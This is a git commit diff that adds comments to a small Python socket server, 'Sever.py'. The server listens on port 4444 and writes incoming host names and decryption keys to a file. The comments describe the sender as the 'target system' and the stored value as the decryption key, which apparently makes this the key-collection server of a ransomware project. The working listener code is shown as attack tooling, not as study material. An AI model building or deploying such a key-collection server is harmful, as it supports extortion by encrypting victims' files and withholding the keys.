0cbd7690514f7fd0922591da33fd87a32a291b89
Kushagra Ojha <86009160+Krushergod@users.noreply.github.com>
2022-02-26 22:00:33 +0530

    Update and rename sever.py to Sever.py

--- Sever.py
+++ Sever.py
@@ -1,11 +1,11 @@
 import socket
 
-IP_ADDRESS = ''
+IP_ADDRESS = '' #Enter your ipaddress
 PORT = 4444
 
 print('Creating Socket')
 
-with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
+with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s: # A Tcp connection on IPV4 will target system.
 	s.bind((IP_ADDRESS,PORT))
 	print('Listening for Connections..........')
 	s.listen(1)
@@ -15,7 +15,7 @@ with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
 	with conn:
 		while True:
 			host_and_key = conn.recv(1024).decode()
-			with open ('Encrypted_host.txt','a') as f:
+			with open ('Encrypted_host.txt','a') as f: # Store the decryption key with there host name
 				f.write(host_and_key+'\n')
 			break
 
